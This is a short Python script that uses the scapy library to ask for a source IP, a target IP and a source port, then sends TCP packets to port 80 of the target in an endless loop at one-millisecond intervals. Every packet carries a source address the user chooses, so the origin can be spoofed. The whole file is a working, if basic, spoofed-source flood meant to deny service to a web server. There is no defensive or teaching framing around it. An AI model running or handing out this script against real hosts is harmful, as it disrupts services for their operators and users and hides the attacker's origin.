from scapy.all import *

source_IP = input("Enter IP Address of the Source: ")
target_IP = input("Enter IP Address of the Target: ")

source_port = int(input("Enter Source Port number: "))

i = 1
while True:
    IP1 = IP(src = source_IP,dst = target_IP)
    TCP1 = TCP(sport = source_port, dport = 80)
    pkt = IP1/TCP1

    send(pkt, inter = 0.001)
    print("Packet sent ",i)
    i = i + 1